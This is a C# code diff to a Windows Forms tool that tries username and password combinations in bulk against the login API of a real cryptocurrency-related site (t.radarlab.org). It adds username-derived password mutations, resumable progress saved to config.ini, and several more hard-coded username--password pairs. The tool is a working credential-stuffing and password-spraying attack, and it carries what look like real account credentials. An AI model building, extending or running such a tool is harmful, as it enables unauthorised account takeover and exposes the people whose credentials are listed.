@@ -6,7 +6,9 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -16,6 +18,43 @@ namespace 主程序202012
 {
     public partial class radr账号验证 : Form
     {
+        [DllImport("kernel32")]
+        private static extern long WritePrivateProfileString(string section, string key, string val, string filePath);
+        [DllImport("kernel32")]
+        private static extern int GetPrivateProfileString(string section, string key, string def, StringBuilder retVal, int size, string filePath);
+
+        string inipath = AppDomain.CurrentDomain.BaseDirectory + "config.ini";
+        /// <summary> 
+        /// 写入INI文件 
+        /// </summary> 
+        /// <param name="Section">项目名称(如 [TypeName] )</param> 
+        /// <param name="Key">键</param> 
+        /// <param name="Value">值</param> 
+        public void IniWriteValue(string Section, string Key, string Value)
+        {
+            WritePrivateProfileString(Section, Key, Value, this.inipath);
+        }
+
+        /// <summary> 
+        /// 读出INI文件 
+        /// </summary> 
+        /// <param name="Section">项目名称(如 [TypeName] )</param> 
+        /// <param name="Key">键</param> 
+        public string IniReadValue(string Section, string Key)
+        {
+            StringBuilder temp = new StringBuilder(500);
+            int i = GetPrivateProfileString(Section, Key, "", temp, 500, this.inipath);
+            return temp.ToString();
+        }
+
+        /// <summary> 
+        /// 验证文件是否存在 
+        /// </summary> 
+        /// <returns>布尔值</returns> 
+        public bool ExistINIFile()
+        {
+            return File.Exists(inipath);
+        }
         public radr账号验证()
         {
             InitializeComponent();
@@ -408,7 +447,10 @@ namespace 主程序202012
 "zcrt22211--zcrt123",
 "lairong1--lairong123",
 "qiulian02--qiulian123",
-"ycx886--ycx123"
+"ycx886--ycx123",
+"daz001--daz111",
+"wbs2--111111",
+"932767356--x123456"
             };
 
             foreach (string item in text)
@@ -426,15 +468,30 @@ namespace 主程序202012
 
         public void run()
         {
+           
             try
             {
-                for (int i = 0; i < listView1.Items.Count; i++)
+
+                int userstart = Convert.ToInt32(textBox5.Text);
+                int passstart = Convert.ToInt32(textBox8.Text);
+
+
+
+                for (int i = passstart; i < listView1.Items.Count; i++)
                 {
                     
-                    for (int j = 0; j < listView1.Items.Count; j++)
+                    for (int j = userstart; j < listView1.Items.Count; j++)
                     {
+                        if (status == false)
+                            return;
                         string user = listView1.Items[j].SubItems[1].Text.Trim();
-                        string pass = listView1.Items[i].SubItems[2].Text.Trim();
+                        string passold = listView1.Items[i].SubItems[2].Text.Trim();
+                        string pass = getnewpass(user,passold);
+                        //写入config.ini配置文件
+                        IniWriteValue("values", "user", j.ToString());
+                        IniWriteValue("values", "pass", i.ToString());
+
+
                         string url = "https://t.radarlab.org/api/user/login";
                         string postdata = "json=%7B%22username%22%3A%22" + user + "%22%2C%22password%22%3A%22" + pass + "%22%7D";
                         string cookie = "theme=dark; ver=6.14.7; _ga=GA1.2.2138962939.1607583565; lang=zh_CN; locale=zh-Hans-CN; _gid=GA1.2.244605734.1608021685; _gat=1";
@@ -519,12 +576,81 @@ namespace 主程序202012
         }
         private void radr账号验证_Load(object sender, EventArgs e)
         {
+            //读取config.ini
+            if (ExistINIFile())
+            {
+                textBox5.Text = IniReadValue("values", "user");
+                textBox8.Text = IniReadValue("values", "pass");
+                textBox1.Text = IniReadValue("values", "ipapi");
+            }
             tabControl1.SelectedIndex = 1;
         }
         Thread thread;
+
+        public string getnewpass(string user,string pass)
+        {
+
+
+            string passAdd = pass;
+
+            string shouzimu = Regex.Match(user,@"[a-zA-Z]{1}").Groups[0].Value;
+            string zimu = Regex.Match(user, @"[a-zA-Z]{1,}").Groups[0].Value;
+            string shuzi = Regex.Match(user, @"\d{1,}").Groups[0].Value;
+            switch (comboBox1.Text)
+            {
+                case "原始密码":
+                    passAdd = pass;
+                    break;
+                case "账号字母加前面":
+                    passAdd = zimu+passAdd;
+                    break;
+                case "账号字母加后面":
+                    passAdd = passAdd+zimu;
+                    break;
+                case "账号首字母加前面":
+                    passAdd =shouzimu+ passAdd;
+                    break;
+                case "账号首字母加后面":
+                    passAdd = passAdd+shouzimu;
+                    break;
+                case "账号首字母大写加前面":
+                    passAdd = shouzimu.ToUpper()+ passAdd;
+                    break;
+                case "账号首字母大写加后面":
+                    passAdd = passAdd+shouzimu.ToUpper();
+                    break;
+                case "账号数字加前面":
+                    passAdd =shuzi+ passAdd;
+                    break;
+                case "账号数字加后面":
+                    passAdd = passAdd+shuzi;
+                    break;
+
+            }
+
+            return passAdd.Trim();
+        }
+
+
+       
         private void button1_Click(object sender, EventArgs e)
         {
+            IniWriteValue("values", "ipapi", textBox1.Text);
+            /*
+             原始密码
+账号字母加前面
+账号字母加后面
+账号首字母加前面
+账号首字母加后面
+账号首字母大写加前面
+账号首字母大写加后面
+账号数字加前面
+账号数字加后面
+*/
             getIP();
+
+
+            status = true;
             if (radioButton1.Checked == true)
             {
                 if (thread == null || !thread.IsAlive)
@@ -549,7 +675,10 @@ namespace 主程序202012
 
         private void 清空账号ToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            listView1.Items.Clear();
+            for (int i = 0; i <listView1.Items.Count; i++)
+            {
+                listView1.Items[i].SubItems[1].Text = "";
+            }
         }
 
 
@@ -577,11 +706,7 @@ namespace 主程序202012
         }
         private void 导入账号ToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            Thread t = new Thread(new ThreadStart(importusers));
-            Control.CheckForIllegalCrossThreadCalls = false;
-            t.SetApartmentState(System.Threading.ApartmentState.STA);                       //将线程eThread设置为单线程单元(STA)模式
-            t.Start();
-          
+           
 
         }
         private void 导入账号和密码ToolStripMenuItem_Click(object sender, EventArgs e)
@@ -626,8 +751,10 @@ namespace 主程序202012
             }
         }
         bool zanting = true;
+        bool status = true;
         private void button2_Click(object sender, EventArgs e)
         {
+           
             if (zanting == false)
             {
                 zanting = true;
@@ -636,6 +763,39 @@ namespace 主程序202012
             {
                 zanting = false;
             }
+        }
+
+        private void 清空密码ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < listView1.Items.Count; i++)
+            {
+                listView1.Items[i].SubItems[2].Text = "";
+            }
+        }
+
+        private void 清空所有ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            listView1.Items.Clear();
+        }
+
+        private void 快速导入会卡顿ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            importusers();
+           
+        }
+
+        private void 普通导入不卡顿时间久ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Thread t = new Thread(new ThreadStart(importusers));
+            Control.CheckForIllegalCrossThreadCalls = false;
+            t.SetApartmentState(System.Threading.ApartmentState.STA);                       //将线程eThread设置为单线程单元(STA)模式
+            t.Start();
+
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            status = false;
         }
     }
 }
